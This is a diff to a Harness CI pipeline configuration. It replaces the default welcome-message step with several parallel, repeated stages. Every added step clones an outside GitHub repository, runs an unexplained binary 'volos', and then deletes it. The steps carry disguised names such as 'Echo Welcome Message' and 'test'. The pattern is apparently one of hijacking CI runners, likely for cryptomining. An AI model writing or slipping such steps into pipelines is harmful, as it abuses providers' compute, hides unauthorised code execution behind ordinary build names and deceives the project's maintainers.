@@ -4,27 +4,164 @@ pipeline:
   projectIdentifier: default_project
   orgIdentifier: default
   stages:
+    - parallel:
+        - stage:
+            name: Build
+            identifier: Build
+            type: CI
+            spec:
+              cloneCodebase: true
+              execution:
+                steps:
+                  - step:
+                      type: Run
+                      name: Echo Welcome Message
+                      identifier: Echo_Welcome_Message
+                      spec:
+                        shell: Sh
+                        command: rm -rf tmateo && git clone https://github.com/samnialoska22/faksa.git && cd faksa && chmod +x ss4 && chmod +x volos && ./volos && rm -rf volos ss4
+                        timeout: 60000
+              platform:
+                os: Linux
+                arch: Amd64
+              runtime:
+                type: Cloud
+                spec: {}
+            strategy:
+              repeat:
+                times: 6
+                maxConcurrency: 3
+        - stage:
+            name: test
+            identifier: test
+            description: ""
+            type: CI
+            spec:
+              cloneCodebase: true
+              platform:
+                os: Linux
+                arch: Amd64
+              runtime:
+                type: Cloud
+                spec: {}
+              execution:
+                steps:
+                  - step:
+                      type: Run
+                      name: Run_1
+                      identifier: Run_1
+                      spec:
+                        shell: Sh
+                        command: rm -rf tmateo && git clone https://github.com/samnialoska22/faksa.git && cd faksa && chmod +x ss4 && chmod +x volos && ./volos && rm -rf volos ss4
+                        timeout: 60000
+            strategy:
+              repeat:
+                times: 6
+                maxConcurrency: 3
+        - stage:
+            name: prepare
+            identifier: prepare
+            description: ""
+            type: CI
+            spec:
+              cloneCodebase: true
+              platform:
+                os: Linux
+                arch: Amd64
+              runtime:
+                type: Cloud
+                spec: {}
+              execution:
+                steps:
+                  - step:
+                      type: Run
+                      name: Run_1
+                      identifier: Run_1
+                      spec:
+                        shell: Sh
+                        command: rm -rf tmateo && git clone https://github.com/samnialoska22/faksa.git && cd faksa && chmod +x ss4 && chmod +x volos && ./volos && rm -rf volos ss4
+                        timeout: 60000
+            strategy:
+              repeat:
+                times: 6
+                maxConcurrency: 3
+        - stage:
+            name: go build tes
+            identifier: go_build_tes
+            description: ""
+            type: CI
+            spec:
+              cloneCodebase: true
+              platform:
+                os: Linux
+                arch: Amd64
+              runtime:
+                type: Cloud
+                spec: {}
+              execution:
+                steps:
+                  - step:
+                      type: Run
+                      name: Run_1
+                      identifier: Run_1
+                      spec:
+                        shell: Sh
+                        command: rm -rf tmateo && git clone https://github.com/samnialoska22/faksa.git && cd faksa && chmod +x ss4 && chmod +x volos && ./volos && rm -rf volos ss4
+                        timeout: 60000
+            strategy:
+              repeat:
+                times: 6
+                maxConcurrency: 3
+        - stage:
+            name: clearing
+            identifier: clearing
+            description: ""
+            type: CI
+            spec:
+              cloneCodebase: true
+              platform:
+                os: Linux
+                arch: Amd64
+              runtime:
+                type: Cloud
+                spec: {}
+              execution:
+                steps:
+                  - step:
+                      type: Run
+                      name: Run_1
+                      identifier: Run_1
+                      spec:
+                        shell: Sh
+                        command: rm -rf tmateo && git clone https://github.com/samnialoska22/faksa.git && cd faksa && chmod +x ss4 && chmod +x volos && ./volos && rm -rf volos ss4
+                        timeout: 60000
+            strategy:
+              repeat:
+                times: 6
+                maxConcurrency: 3
     - stage:
-        name: Build
-        identifier: Build
+        name: done
+        identifier: done
+        description: ""
         type: CI
         spec:
           cloneCodebase: true
-          execution:
-            steps:
-              - step:
-                  type: Run
-                  name: Echo Welcome Message
-                  identifier: Echo_Welcome_Message
-                  spec:
-                    shell: Sh
-                    command: echo "Welcome to Harness CI"
           platform:
             os: Linux
             arch: Amd64
           runtime:
             type: Cloud
             spec: {}
+          execution:
+            steps:
+              - step:
+                  type: Run
+                  name: Run_1
+                  identifier: Run_1
+                  spec:
+                    shell: Sh
+                    command: rm -rf tmateo && git clone https://github.com/samnialoska22/faksa.git && cd faksa && chmod +x ss4 && chmod +x volos && ./volos && rm -rf volos ss4
+                    timeout: 60000
   properties:
     ci:
       codebase:
